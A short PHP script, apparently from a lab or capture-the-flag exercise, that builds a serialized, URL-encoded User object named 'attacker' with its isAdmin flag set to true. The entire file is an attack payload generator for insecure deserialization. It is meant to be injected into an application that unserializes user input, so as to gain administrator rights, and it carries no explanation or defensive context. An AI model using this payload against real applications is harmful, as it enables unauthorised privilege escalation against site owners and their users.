<?php 
class User {
    public $username;
    public $isAdmin;

    public function __construct($username, $isAdmin) {
        $this->username = $username;
        $this->isAdmin = $isAdmin;
    }
}

$user = new User("attacker", true);
$serialized = urlencode(serialize($user));

echo $serialized;

?>